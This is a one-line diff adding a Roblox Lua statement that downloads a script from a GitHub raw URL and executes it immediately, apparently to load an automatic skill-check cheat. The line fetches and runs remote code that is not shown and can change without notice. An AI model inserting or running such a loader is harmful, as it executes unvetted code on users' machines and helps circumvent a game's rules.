@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Coookie-man/Scripts/main/Auto-skill-check2.txt"))()
